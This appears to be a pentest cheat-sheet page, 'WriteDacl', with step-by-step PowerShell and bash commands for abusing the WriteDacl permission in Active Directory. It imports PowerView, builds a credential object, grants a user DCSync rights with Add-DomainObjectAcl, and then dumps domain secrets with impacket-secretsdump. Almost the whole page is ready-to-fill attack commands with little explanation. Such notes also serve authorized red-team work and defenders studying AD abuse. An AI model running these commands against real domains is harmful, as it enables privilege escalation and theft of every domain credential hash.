---
title: "WriteDacl"
date: 2024-7-12
tags: ["WriteDacl", "active driectory", "ad", "Windows", "dcsync", "secretsdump"]
---

---
### Abuse #1: Add dcsync right to user

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView.ps1 

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Create cred object (runas) \[optional\]

<div>

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

</div>

#### 3. Add dcsync right

<div>

```powershell
Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred
```

</div>

{{< /tabcontent >}}

### 4. Secrets dump

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```bash
impacket-secretsdump <USER>:<PASSWORD>@<TARGET>
```

</div>

{{< /tabcontent >}}

<br>